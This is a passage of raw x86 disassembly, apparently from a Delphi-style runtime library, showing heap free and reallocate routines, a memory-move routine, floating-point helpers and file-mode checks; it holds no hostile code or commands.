  4023aa:	c7 05 b0 95 42 00 08 	movl   $0x8,0x4295b0
  4023b1:	00 00 00 
  4023b4:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  4023bb:	e9 96 01 00 00       	jmp    0x402556
  4023c0:	33 d2                	xor    %edx,%edx
  4023c2:	55                   	push   %ebp
  4023c3:	68 4f 25 40 00       	push   $0x40254f
  4023c8:	64 ff 32             	push   %fs:(%edx)
  4023cb:	64 89 22             	mov    %esp,%fs:(%edx)
  4023ce:	80 3d 35 90 42 00 00 	cmpb   $0x0,0x429035
  4023d5:	74 0a                	je     0x4023e1
  4023d7:	68 b4 95 42 00       	push   $0x4295b4
  4023dc:	e8 7f ed ff ff       	call   0x401160
  4023e1:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4023e4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4023e7:	83 e8 04             	sub    $0x4,%eax
  4023ea:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4023ed:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4023f0:	8b 18                	mov    (%eax),%ebx
  4023f2:	f6 c3 02             	test   $0x2,%bl
  4023f5:	75 0f                	jne    0x402406
  4023f7:	c7 05 b0 95 42 00 09 	movl   $0x9,0x4295b0
  4023fe:	00 00 00 
  402401:	e9 20 01 00 00       	jmp    0x402526
  402406:	ff 0d 9c 95 42 00    	decl   0x42959c
  40240c:	8b c3                	mov    %ebx,%eax
  40240e:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  402413:	83 e8 04             	sub    $0x4,%eax
  402416:	29 05 a0 95 42 00    	sub    %eax,0x4295a0
  40241c:	f6 c3 01             	test   $0x1,%bl
  40241f:	74 53                	je     0x402474
  402421:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402424:	83 e8 0c             	sub    $0xc,%eax
  402427:	8b 40 08             	mov    0x8(%eax),%eax
  40242a:	83 f8 0c             	cmp    $0xc,%eax
  40242d:	7c 07                	jl     0x402436
  40242f:	a9 03 00 00 80       	test   $0x80000003,%eax
  402434:	74 0f                	je     0x402445
  402436:	c7 05 b0 95 42 00 0a 	movl   $0xa,0x4295b0
  40243d:	00 00 00 
  402440:	e9 e1 00 00 00       	jmp    0x402526
  402445:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402448:	2b d0                	sub    %eax,%edx
  40244a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40244d:	8b 55 f0             	mov    -0x10(%ebp),%edx
  402450:	3b 42 08             	cmp    0x8(%edx),%eax
  402453:	74 0f                	je     0x402464
  402455:	c7 05 b0 95 42 00 0a 	movl   $0xa,0x4295b0
  40245c:	00 00 00 
  40245f:	e9 c2 00 00 00       	jmp    0x402526
  402464:	03 d8                	add    %eax,%ebx
  402466:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402469:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40246c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40246f:	e8 e4 f6 ff ff       	call   0x401b58
  402474:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  40247a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40247d:	03 c3                	add    %ebx,%eax
  40247f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402482:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402485:	3b 05 08 96 42 00    	cmp    0x429608,%eax
  40248b:	75 2c                	jne    0x4024b9
  40248d:	29 1d 08 96 42 00    	sub    %ebx,0x429608
  402493:	01 1d 04 96 42 00    	add    %ebx,0x429604
  402499:	81 3d 04 96 42 00 00 	cmpl   $0x3c00,0x429604
  4024a0:	3c 00 00 
  4024a3:	7e 05                	jle    0x4024aa
  4024a5:	e8 7a fa ff ff       	call   0x401f24
  4024aa:	33 c0                	xor    %eax,%eax
  4024ac:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024af:	e8 10 0d 00 00       	call   0x4031c4
  4024b4:	e9 9d 00 00 00       	jmp    0x402556
  4024b9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4024bc:	8b 00                	mov    (%eax),%eax
  4024be:	a8 02                	test   $0x2,%al
  4024c0:	74 1e                	je     0x4024e0
  4024c2:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4024c7:	83 f8 04             	cmp    $0x4,%eax
  4024ca:	7d 0c                	jge    0x4024d8
  4024cc:	c7 05 b0 95 42 00 0b 	movl   $0xb,0x4295b0
  4024d3:	00 00 00 
  4024d6:	eb 4e                	jmp    0x402526
  4024d8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4024db:	83 08 01             	orl    $0x1,(%eax)
  4024de:	eb 3c                	jmp    0x40251c
  4024e0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4024e3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4024e6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4024e9:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4024ed:	74 11                	je     0x402500
  4024ef:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4024f2:	83 38 00             	cmpl   $0x0,(%eax)
  4024f5:	74 09                	je     0x402500
  4024f7:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4024fa:	83 78 08 0c          	cmpl   $0xc,0x8(%eax)
  4024fe:	7d 0c                	jge    0x40250c
  402500:	c7 05 b0 95 42 00 0b 	movl   $0xb,0x4295b0
  402507:	00 00 00 
  40250a:	eb 1a                	jmp    0x402526
  40250c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40250f:	8b 40 08             	mov    0x8(%eax),%eax
  402512:	03 d8                	add    %eax,%ebx
  402514:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402517:	e8 3c f6 ff ff       	call   0x401b58
  40251c:	8b d3                	mov    %ebx,%edx
  40251e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402521:	e8 06 f9 ff ff       	call   0x401e2c
  402526:	a1 b0 95 42 00       	mov    0x4295b0,%eax
  40252b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40252e:	33 c0                	xor    %eax,%eax
  402530:	5a                   	pop    %edx
  402531:	59                   	pop    %ecx
  402532:	59                   	pop    %ecx
  402533:	64 89 10             	mov    %edx,%fs:(%eax)
  402536:	68 56 25 40 00       	push   $0x402556
  40253b:	80 3d 35 90 42 00 00 	cmpb   $0x0,0x429035
  402542:	74 0a                	je     0x40254e
  402544:	68 b4 95 42 00       	push   $0x4295b4
  402549:	e8 1a ec ff ff       	call   0x401168
  40254e:	c3                   	ret
  40254f:	e9 b4 0b 00 00       	jmp    0x403108
  402554:	eb e5                	jmp    0x40253b
  402556:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402559:	5b                   	pop    %ebx
  40255a:	8b e5                	mov    %ebp,%esp
  40255c:	5d                   	pop    %ebp
  40255d:	c3                   	ret
  40255e:	8b c0                	mov    %eax,%eax
  402560:	53                   	push   %ebx
  402561:	56                   	push   %esi
  402562:	57                   	push   %edi
  402563:	55                   	push   %ebp
  402564:	83 c4 f4             	add    $0xfffffff4,%esp
  402567:	8b da                	mov    %edx,%ebx
  402569:	83 c3 07             	add    $0x7,%ebx
  40256c:	83 e3 fc             	and    $0xfffffffc,%ebx
  40256f:	83 fb 0c             	cmp    $0xc,%ebx
  402572:	7d 05                	jge    0x402579
  402574:	bb 0c 00 00 00       	mov    $0xc,%ebx
  402579:	83 e8 04             	sub    $0x4,%eax
  40257c:	89 04 24             	mov    %eax,(%esp)
  40257f:	8b 04 24             	mov    (%esp),%eax
  402582:	8b 30                	mov    (%eax),%esi
  402584:	81 e6 fc ff ff 7f    	and    $0x7ffffffc,%esi
  40258a:	8b 04 24             	mov    (%esp),%eax
  40258d:	03 c6                	add    %esi,%eax
  40258f:	89 44 24 04          	mov    %eax,0x4(%esp)
  402593:	3b f3                	cmp    %ebx,%esi
  402595:	75 07                	jne    0x40259e
  402597:	b0 01                	mov    $0x1,%al
  402599:	e9 bd 01 00 00       	jmp    0x40275b
  40259e:	3b f3                	cmp    %ebx,%esi
  4025a0:	0f 8e 90 00 00 00    	jle    0x402636
  4025a6:	8b ee                	mov    %esi,%ebp
  4025a8:	2b eb                	sub    %ebx,%ebp
  4025aa:	8b 54 24 04          	mov    0x4(%esp),%edx
  4025ae:	3b 15 08 96 42 00    	cmp    0x429608,%edx
  4025b4:	75 2c                	jne    0x4025e2
  4025b6:	29 2d 08 96 42 00    	sub    %ebp,0x429608
  4025bc:	01 2d 04 96 42 00    	add    %ebp,0x429604
  4025c2:	83 3d 04 96 42 00 0c 	cmpl   $0xc,0x429604
  4025c9:	0f 8d 6f 01 00 00    	jge    0x40273e
  4025cf:	01 2d 08 96 42 00    	add    %ebp,0x429608
  4025d5:	29 2d 04 96 42 00    	sub    %ebp,0x429604
  4025db:	8b de                	mov    %esi,%ebx
  4025dd:	e9 5c 01 00 00       	jmp    0x40273e
  4025e2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4025e6:	8b 44 24 04          	mov    0x4(%esp),%eax
  4025ea:	f6 00 02             	testb  $0x2,(%eax)
  4025ed:	75 18                	jne    0x402607
  4025ef:	8b 44 24 04          	mov    0x4(%esp),%eax
  4025f3:	89 44 24 08          	mov    %eax,0x8(%esp)
  4025f7:	8b 44 24 08          	mov    0x8(%esp),%eax
  4025fb:	03 68 08             	add    0x8(%eax),%ebp
  4025fe:	8b 44 24 08          	mov    0x8(%esp),%eax
  402602:	e8 51 f5 ff ff       	call   0x401b58
  402607:	83 fd 0c             	cmp    $0xc,%ebp
  40260a:	7c 23                	jl     0x40262f
  40260c:	8b 04 24             	mov    (%esp),%eax
  40260f:	03 c3                	add    %ebx,%eax
  402611:	89 44 24 04          	mov    %eax,0x4(%esp)
  402615:	83 cd 02             	or     $0x2,%ebp
  402618:	8b 44 24 04          	mov    0x4(%esp),%eax
  40261c:	89 28                	mov    %ebp,(%eax)
  40261e:	8b 44 24 04          	mov    0x4(%esp),%eax
  402622:	83 c0 04             	add    $0x4,%eax
  402625:	e8 42 f6 ff ff       	call   0x401c6c
  40262a:	e9 0f 01 00 00       	jmp    0x40273e
  40262f:	8b de                	mov    %esi,%ebx
  402631:	e9 08 01 00 00       	jmp    0x40273e
  402636:	8b fb                	mov    %ebx,%edi
  402638:	2b fe                	sub    %esi,%edi
  40263a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40263e:	3b 05 08 96 42 00    	cmp    0x429608,%eax
  402644:	75 65                	jne    0x4026ab
  402646:	3b 3d 04 96 42 00    	cmp    0x429604,%edi
  40264c:	7f 4f                	jg     0x40269d
  40264e:	29 3d 04 96 42 00    	sub    %edi,0x429604
  402654:	01 3d 08 96 42 00    	add    %edi,0x429608
  40265a:	83 3d 04 96 42 00 0c 	cmpl   $0xc,0x429604
  402661:	7d 18                	jge    0x40267b
  402663:	a1 04 96 42 00       	mov    0x429604,%eax
  402668:	01 05 08 96 42 00    	add    %eax,0x429608
  40266e:	03 1d 04 96 42 00    	add    0x429604,%ebx
  402674:	33 c0                	xor    %eax,%eax
  402676:	a3 04 96 42 00       	mov    %eax,0x429604
  40267b:	8b c3                	mov    %ebx,%eax
  40267d:	2b c6                	sub    %esi,%eax
  40267f:	01 05 a0 95 42 00    	add    %eax,0x4295a0
  402685:	8b 04 24             	mov    (%esp),%eax
  402688:	8b 00                	mov    (%eax),%eax
  40268a:	25 03 00 00 80       	and    $0x80000003,%eax
  40268f:	0b d8                	or     %eax,%ebx
  402691:	8b 04 24             	mov    (%esp),%eax
  402694:	89 18                	mov    %ebx,(%eax)
  402696:	b0 01                	mov    $0x1,%al
  402698:	e9 be 00 00 00       	jmp    0x40275b
  40269d:	e8 82 f8 ff ff       	call   0x401f24
  4026a2:	8b 04 24             	mov    (%esp),%eax
  4026a5:	03 c6                	add    %esi,%eax
  4026a7:	89 44 24 04          	mov    %eax,0x4(%esp)
  4026ab:	8b 44 24 04          	mov    0x4(%esp),%eax
  4026af:	f6 00 02             	testb  $0x2,(%eax)
  4026b2:	75 4f                	jne    0x402703
  4026b4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4026b8:	89 44 24 08          	mov    %eax,0x8(%esp)
  4026bc:	8b 54 24 08          	mov    0x8(%esp),%edx
  4026c0:	8b 6a 08             	mov    0x8(%edx),%ebp
  4026c3:	3b fd                	cmp    %ebp,%edi
  4026c5:	7e 0a                	jle    0x4026d1
  4026c7:	03 c5                	add    %ebp,%eax
  4026c9:	89 44 24 04          	mov    %eax,0x4(%esp)
  4026cd:	2b fd                	sub    %ebp,%edi
  4026cf:	eb 32                	jmp    0x402703
  4026d1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4026d5:	e8 7e f4 ff ff       	call   0x401b58
  4026da:	2b ef                	sub    %edi,%ebp
  4026dc:	83 fd 0c             	cmp    $0xc,%ebp
  4026df:	7c 0e                	jl     0x4026ef
  4026e1:	8b 04 24             	mov    (%esp),%eax
  4026e4:	03 c3                	add    %ebx,%eax
  4026e6:	8b d5                	mov    %ebp,%edx
  4026e8:	e8 3f f7 ff ff       	call   0x401e2c
  4026ed:	eb 4f                	jmp    0x40273e
  4026ef:	03 dd                	add    %ebp,%ebx
  4026f1:	8b 04 24             	mov    (%esp),%eax
  4026f4:	03 c3                	add    %ebx,%eax
  4026f6:	89 44 24 04          	mov    %eax,0x4(%esp)
  4026fa:	8b 44 24 04          	mov    0x4(%esp),%eax
  4026fe:	83 20 fe             	andl   $0xfffffffe,(%eax)
  402701:	eb 3b                	jmp    0x40273e
  402703:	8b 44 24 04          	mov    0x4(%esp),%eax
  402707:	8b 00                	mov    (%eax),%eax
  402709:	a9 00 00 00 80       	test   $0x80000000,%eax
  40270e:	74 2a                	je     0x40273a
  402710:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  402715:	03 44 24 04          	add    0x4(%esp),%eax
  402719:	89 44 24 04          	mov    %eax,0x4(%esp)
  40271d:	8b d7                	mov    %edi,%edx
  40271f:	8b 44 24 04          	mov    0x4(%esp),%eax
  402723:	e8 00 f9 ff ff       	call   0x402028
  402728:	84 c0                	test   %al,%al
  40272a:	74 0e                	je     0x40273a
  40272c:	8b 04 24             	mov    (%esp),%eax
  40272f:	03 c6                	add    %esi,%eax
  402731:	89 44 24 04          	mov    %eax,0x4(%esp)
  402735:	e9 fc fe ff ff       	jmp    0x402636
  40273a:	33 c0                	xor    %eax,%eax
  40273c:	eb 1d                	jmp    0x40275b
  40273e:	8b c3                	mov    %ebx,%eax
  402740:	2b c6                	sub    %esi,%eax
  402742:	01 05 a0 95 42 00    	add    %eax,0x4295a0
  402748:	8b 04 24             	mov    (%esp),%eax
  40274b:	8b 00                	mov    (%eax),%eax
  40274d:	25 03 00 00 80       	and    $0x80000003,%eax
  402752:	0b d8                	or     %eax,%ebx
  402754:	8b 04 24             	mov    (%esp),%eax
  402757:	89 18                	mov    %ebx,(%eax)
  402759:	b0 01                	mov    $0x1,%al
  40275b:	83 c4 0c             	add    $0xc,%esp
  40275e:	5d                   	pop    %ebp
  40275f:	5f                   	pop    %edi
  402760:	5e                   	pop    %esi
  402761:	5b                   	pop    %ebx
  402762:	c3                   	ret
  402763:	90                   	nop
  402764:	55                   	push   %ebp
  402765:	8b ec                	mov    %esp,%ebp
  402767:	83 c4 f8             	add    $0xfffffff8,%esp
  40276a:	53                   	push   %ebx
  40276b:	56                   	push   %esi
  40276c:	8b f2                	mov    %edx,%esi
  40276e:	8b d8                	mov    %eax,%ebx
  402770:	80 3d ac 95 42 00 00 	cmpb   $0x0,0x4295ac
  402777:	75 13                	jne    0x40278c
  402779:	e8 02 f2 ff ff       	call   0x401980
  40277e:	84 c0                	test   %al,%al
  402780:	75 0a                	jne    0x40278c
  402782:	33 c0                	xor    %eax,%eax
  402784:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402787:	e9 98 00 00 00       	jmp    0x402824
  40278c:	33 d2                	xor    %edx,%edx
  40278e:	55                   	push   %ebp
  40278f:	68 1d 28 40 00       	push   $0x40281d
  402794:	64 ff 32             	push   %fs:(%edx)
  402797:	64 89 22             	mov    %esp,%fs:(%edx)
  40279a:	80 3d 35 90 42 00 00 	cmpb   $0x0,0x429035
  4027a1:	74 0a                	je     0x4027ad
  4027a3:	68 b4 95 42 00       	push   $0x4295b4
  4027a8:	e8 b3 e9 ff ff       	call   0x401160
  4027ad:	8b d6                	mov    %esi,%edx
  4027af:	8b c3                	mov    %ebx,%eax
  4027b1:	e8 aa fd ff ff       	call   0x402560
  4027b6:	84 c0                	test   %al,%al
  4027b8:	74 05                	je     0x4027bf
  4027ba:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4027bd:	eb 3d                	jmp    0x4027fc
  4027bf:	8b c6                	mov    %esi,%eax
  4027c1:	e8 16 fa ff ff       	call   0x4021dc
  4027c6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4027c9:	8b c3                	mov    %ebx,%eax
  4027cb:	83 e8 04             	sub    $0x4,%eax
  4027ce:	8b 00                	mov    (%eax),%eax
  4027d0:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4027d5:	83 e8 04             	sub    $0x4,%eax
  4027d8:	3b f0                	cmp    %eax,%esi
  4027da:	7d 02                	jge    0x4027de
  4027dc:	8b c6                	mov    %esi,%eax
  4027de:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4027e2:	74 12                	je     0x4027f6
  4027e4:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4027e7:	8b cb                	mov    %ebx,%ecx
  4027e9:	91                   	xchg   %eax,%ecx
  4027ea:	e8 55 01 00 00       	call   0x402944
  4027ef:	8b c3                	mov    %ebx,%eax
  4027f1:	e8 92 fb ff ff       	call   0x402388
  4027f6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4027f9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4027fc:	33 c0                	xor    %eax,%eax
  4027fe:	5a                   	pop    %edx
  4027ff:	59                   	pop    %ecx
  402800:	59                   	pop    %ecx
  402801:	64 89 10             	mov    %edx,%fs:(%eax)
  402804:	68 24 28 40 00       	push   $0x402824
  402809:	80 3d 35 90 42 00 00 	cmpb   $0x0,0x429035
  402810:	74 0a                	je     0x40281c
  402812:	68 b4 95 42 00       	push   $0x4295b4
  402817:	e8 4c e9 ff ff       	call   0x401168
  40281c:	c3                   	ret
  40281d:	e9 e6 08 00 00       	jmp    0x403108
  402822:	eb e5                	jmp    0x402809
  402824:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402827:	5e                   	pop    %esi
  402828:	5b                   	pop    %ebx
  402829:	59                   	pop    %ecx
  40282a:	59                   	pop    %ecx
  40282b:	5d                   	pop    %ebp
  40282c:	c3                   	ret
  40282d:	8d 40 00             	lea    0x0(%eax),%eax
  402830:	53                   	push   %ebx
  402831:	51                   	push   %ecx
  402832:	8b d8                	mov    %eax,%ebx
  402834:	85 db                	test   %ebx,%ebx
  402836:	7e 1a                	jle    0x402852
  402838:	8b c3                	mov    %ebx,%eax
  40283a:	ff 15 2c 60 42 00    	call   *0x42602c
  402840:	89 04 24             	mov    %eax,(%esp)
  402843:	83 3c 24 00          	cmpl   $0x0,(%esp)
  402847:	75 0e                	jne    0x402857
  402849:	b0 01                	mov    $0x1,%al
  40284b:	e8 d8 00 00 00       	call   0x402928
  402850:	eb 05                	jmp    0x402857
  402852:	33 c0                	xor    %eax,%eax
  402854:	89 04 24             	mov    %eax,(%esp)
  402857:	8b 04 24             	mov    (%esp),%eax
  40285a:	5a                   	pop    %edx
  40285b:	5b                   	pop    %ebx
  40285c:	c3                   	ret
  40285d:	8d 40 00             	lea    0x0(%eax),%eax
  402860:	53                   	push   %ebx
  402861:	85 c0                	test   %eax,%eax
  402863:	74 15                	je     0x40287a
  402865:	ff 15 30 60 42 00    	call   *0x426030
  40286b:	8b d8                	mov    %eax,%ebx
  40286d:	85 db                	test   %ebx,%ebx
  40286f:	74 0b                	je     0x40287c
  402871:	b0 02                	mov    $0x2,%al
  402873:	e8 b0 00 00 00       	call   0x402928
  402878:	eb 02                	jmp    0x40287c
  40287a:	33 db                	xor    %ebx,%ebx
  40287c:	8b c3                	mov    %ebx,%eax
  40287e:	5b                   	pop    %ebx
  40287f:	c3                   	ret
  402880:	8b 08                	mov    (%eax),%ecx
  402882:	85 c9                	test   %ecx,%ecx
  402884:	74 32                	je     0x4028b8
  402886:	85 d2                	test   %edx,%edx
  402888:	74 18                	je     0x4028a2
  40288a:	50                   	push   %eax
  40288b:	89 c8                	mov    %ecx,%eax
  40288d:	ff 15 34 60 42 00    	call   *0x426034
  402893:	59                   	pop    %ecx
  402894:	09 c0                	or     %eax,%eax
  402896:	74 19                	je     0x4028b1
  402898:	89 01                	mov    %eax,(%ecx)
  40289a:	c3                   	ret
  40289b:	b0 02                	mov    $0x2,%al
  40289d:	e9 86 00 00 00       	jmp    0x402928
  4028a2:	89 10                	mov    %edx,(%eax)
  4028a4:	89 c8                	mov    %ecx,%eax
  4028a6:	ff 15 30 60 42 00    	call   *0x426030
  4028ac:	09 c0                	or     %eax,%eax
  4028ae:	75 eb                	jne    0x40289b
  4028b0:	c3                   	ret
  4028b1:	b0 01                	mov    $0x1,%al
  4028b3:	e9 70 00 00 00       	jmp    0x402928
  4028b8:	85 d2                	test   %edx,%edx
  4028ba:	74 10                	je     0x4028cc
  4028bc:	50                   	push   %eax
  4028bd:	89 d0                	mov    %edx,%eax
  4028bf:	ff 15 2c 60 42 00    	call   *0x42602c
  4028c5:	59                   	pop    %ecx
  4028c6:	09 c0                	or     %eax,%eax
  4028c8:	74 e7                	je     0x4028b1
  4028ca:	89 01                	mov    %eax,(%ecx)
  4028cc:	c3                   	ret
  4028cd:	8d 40 00             	lea    0x0(%eax),%eax
  4028d0:	89 15 04 60 42 00    	mov    %edx,0x426004
  4028d6:	e8 a1 0d 00 00       	call   0x40367c
  4028db:	c3                   	ret
  4028dc:	53                   	push   %ebx
  4028dd:	56                   	push   %esi
  4028de:	8b f2                	mov    %edx,%esi
  4028e0:	8b d8                	mov    %eax,%ebx
  4028e2:	80 e3 7f             	and    $0x7f,%bl
  4028e5:	83 3d 08 90 42 00 00 	cmpl   $0x0,0x429008
  4028ec:	74 0a                	je     0x4028f8
  4028ee:	8b d6                	mov    %esi,%edx
  4028f0:	8b c3                	mov    %ebx,%eax
  4028f2:	ff 15 08 90 42 00    	call   *0x429008
  4028f8:	84 db                	test   %bl,%bl
  4028fa:	75 0d                	jne    0x402909
  4028fc:	e8 4f 1d 00 00       	call   0x404650
  402901:	8b 98 04 00 00 00    	mov    0x4(%eax),%ebx
  402907:	eb 0f                	jmp    0x402918
  402909:	80 fb 18             	cmp    $0x18,%bl
  40290c:	77 0a                	ja     0x402918
  40290e:	33 c0                	xor    %eax,%eax
  402910:	8a c3                	mov    %bl,%al
  402912:	8a 98 38 60 42 00    	mov    0x426038(%eax),%bl
  402918:	33 c0                	xor    %eax,%eax
  40291a:	8a c3                	mov    %bl,%al
  40291c:	8b d6                	mov    %esi,%edx
  40291e:	e8 ad ff ff ff       	call   0x4028d0
  402923:	5e                   	pop    %esi
  402924:	5b                   	pop    %ebx
  402925:	c3                   	ret
  402926:	8b c0                	mov    %eax,%eax
  402928:	83 e0 7f             	and    $0x7f,%eax
  40292b:	8b 14 24             	mov    (%esp),%edx
  40292e:	e9 a9 ff ff ff       	jmp    0x4028dc
  402933:	c3                   	ret
  402934:	53                   	push   %ebx
  402935:	8b d8                	mov    %eax,%ebx
  402937:	e8 14 1d 00 00       	call   0x404650
  40293c:	89 98 04 00 00 00    	mov    %ebx,0x4(%eax)
  402942:	5b                   	pop    %ebx
  402943:	c3                   	ret
  402944:	56                   	push   %esi
  402945:	57                   	push   %edi
  402946:	89 c6                	mov    %eax,%esi
  402948:	89 d7                	mov    %edx,%edi
  40294a:	89 c8                	mov    %ecx,%eax
  40294c:	39 f7                	cmp    %esi,%edi
  40294e:	77 13                	ja     0x402963
  402950:	74 2f                	je     0x402981
  402952:	c1 f9 02             	sar    $0x2,%ecx
  402955:	78 2a                	js     0x402981
  402957:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402959:	89 c1                	mov    %eax,%ecx
  40295b:	83 e1 03             	and    $0x3,%ecx
  40295e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402960:	5f                   	pop    %edi
  402961:	5e                   	pop    %esi
  402962:	c3                   	ret
  402963:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  402967:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  40296b:	c1 f9 02             	sar    $0x2,%ecx
  40296e:	78 11                	js     0x402981
  402970:	fd                   	std
  402971:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402973:	89 c1                	mov    %eax,%ecx
  402975:	83 e1 03             	and    $0x3,%ecx
  402978:	83 c6 03             	add    $0x3,%esi
  40297b:	83 c7 03             	add    $0x3,%edi
  40297e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402980:	fc                   	cld
  402981:	5f                   	pop    %edi
  402982:	5e                   	pop    %esi
  402983:	c3                   	ret
  402984:	d9 ea                	fldl2e
  402986:	de c9                	fmulp  %st,%st(1)
  402988:	d9 c0                	fld    %st(0)
  40298a:	d9 fc                	frndint
  40298c:	dc e9                	fsubr  %st,%st(1)
  40298e:	d9 c9                	fxch   %st(1)
  402990:	d9 f0                	f2xm1
  402992:	d9 e8                	fld1
  402994:	de c1                	faddp  %st,%st(1)
  402996:	d9 fd                	fscale
  402998:	dd d9                	fstp   %st(1)
  40299a:	c3                   	ret
  40299b:	90                   	nop
  40299c:	83 ec 08             	sub    $0x8,%esp
  40299f:	df 3c 24             	fistpll (%esp)
  4029a2:	9b                   	fwait
  4029a3:	58                   	pop    %eax
  4029a4:	5a                   	pop    %edx
  4029a5:	c3                   	ret
  4029a6:	8b c0                	mov    %eax,%eax
  4029a8:	83 ec 0c             	sub    $0xc,%esp
  4029ab:	d9 3c 24             	fnstcw (%esp)
  4029ae:	d9 7c 24 02          	fnstcw 0x2(%esp)
  4029b2:	9b                   	fwait
  4029b3:	66 81 4c 24 02 00 0f 	orw    $0xf00,0x2(%esp)
  4029ba:	d9 6c 24 02          	fldcw  0x2(%esp)
  4029be:	df 7c 24 04          	fistpll 0x4(%esp)
  4029c2:	9b d9 2c 24          	fldcw  (%esp)
  4029c6:	59                   	pop    %ecx
  4029c7:	58                   	pop    %eax
  4029c8:	5a                   	pop    %edx
  4029c9:	c3                   	ret
  4029ca:	8b c0                	mov    %eax,%eax
  4029cc:	53                   	push   %ebx
  4029cd:	56                   	push   %esi
  4029ce:	8b d8                	mov    %eax,%ebx
  4029d0:	33 f6                	xor    %esi,%esi
  4029d2:	66 8b 43 04          	mov    0x4(%ebx),%ax
  4029d6:	66 3d b1 d7          	cmp    $0xd7b1,%ax
  4029da:	72 2f                	jb     0x402a0b
  4029dc:	66 3d b3 d7          	cmp    $0xd7b3,%ax
  4029e0:	77 29                	ja     0x402a0b
  4029e2:	66 25 b2 d7          	and    $0xd7b2,%ax
  4029e6:	66 3d b2 d7          	cmp    $0xd7b2,%ax
  4029ea:	75 07                	jne    0x4029f3
  4029ec:	8b c3                	mov    %ebx,%eax
  4029ee:	ff 53 1c             	call   *0x1c(%ebx)
  4029f1:	8b f0                	mov    %eax,%esi
  4029f3:	85 f6                	test   %esi,%esi
  4029f5:	75 07                	jne    0x4029fe
  4029f7:	8b c3                	mov    %ebx,%eax
  4029f9:	ff 53 24             	call   *0x24(%ebx)
  4029fc:	8b f0                	mov    %eax,%esi
  4029fe:	85 f6                	test   %esi,%esi
  402a00:	74 1b                	je     0x402a1d
  402a02:	8b c6                	mov    %esi,%eax
  402a04:	e8 2b ff ff ff       	call   0x402934
  402a09:	eb 12                	jmp    0x402a1d
  402a0b:	81 fb 38 90 42 00    	cmp    $0x429038,%ebx
  402a11:	74 0a                	je     0x402a1d
  402a13:	b8 67 00 00 00       	mov    $0x67,%eax
  402a18:	e8 17 ff ff ff       	call   0x402934
  402a1d:	8b c6                	mov    %esi,%eax
  402a1f:	5e                   	pop    %esi
  402a20:	5b                   	pop    %ebx
  402a21:	c3                   	ret
  402a22:	8b c0                	mov    %eax,%eax
  402a24:	53                   	push   %ebx
  402a25:	56                   	push   %esi
  402a26:	51                   	push   %ecx
  402a27:	89 ce                	mov    %ecx,%esi
  402a29:	c1 ee 02             	shr    $0x2,%esi
  402a2c:	74 26                	je     0x402a54
  402a2e:	8b 08                	mov    (%eax),%ecx
  402a30:	8b 1a                	mov    (%edx),%ebx
  402a32:	39 d9                	cmp    %ebx,%ecx
  402a34:	75 45                	jne    0x402a7b
  402a36:	4e                   	dec    %esi
  402a37:	74 15                	je     0x402a4e
  402a39:	8b 48 04             	mov    0x4(%eax),%ecx
  402a3c:	8b 5a 04             	mov    0x4(%edx),%ebx
  402a3f:	39 d9                	cmp    %ebx,%ecx
  402a41:	75 38                	jne    0x402a7b
  402a43:	83 c0 08             	add    $0x8,%eax
  402a46:	83 c2 08             	add    $0x8,%edx
  402a49:	4e                   	dec    %esi
  402a4a:	75 e2                	jne    0x402a2e
  402a4c:	eb 06                	jmp    0x402a54
  402a4e:	83 c0 04             	add    $0x4,%eax
  402a51:	83 c2 04             	add    $0x4,%edx
  402a54:	5e                   	pop    %esi
  402a55:	83 e6 03             	and    $0x3,%esi
  402a58:	74 36                	je     0x402a90
  402a5a:	8a 08                	mov    (%eax),%cl
  402a5c:	3a 0a                	cmp    (%edx),%cl
  402a5e:	75 30                	jne    0x402a90
  402a60:	4e                   	dec    %esi
  402a61:	74 13                	je     0x402a76
  402a63:	8a 48 01             	mov    0x1(%eax),%cl
